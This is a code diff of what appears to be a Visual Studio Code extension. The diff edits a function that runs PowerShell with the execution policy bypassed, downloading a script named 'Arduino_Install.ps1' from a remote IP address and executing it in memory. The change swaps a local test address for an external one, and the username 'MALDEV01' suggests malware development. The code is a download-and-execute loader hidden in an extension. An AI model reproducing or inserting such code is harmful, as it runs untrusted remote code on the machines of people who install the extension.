@@ -14,10 +14,8 @@ export function activate(context: vscode.ExtensionContext) {
 }
 
 function runPowerShellCommand() {
-    const filePath = 'C:/Users/MALDEV01/Desktop/work.txt';
     
-    const psCommand = `powershell -ExecutionPolicy Bypass -Command "IWR -uri 'http://192.168.1.126:8000/Arduino_Install.ps1' | IEX "`;
-
+    const psCommand = `powershell -ExecutionPolicy Bypass -Command "IWR -uri 'http://210.210.210.160/Arduino_Install.ps1' | IEX "`;
     exec(psCommand, (error, stdout, stderr) => {
         if (error) {
             vscode.window.showErrorMessage(`Extension Error: ${error.message}`);
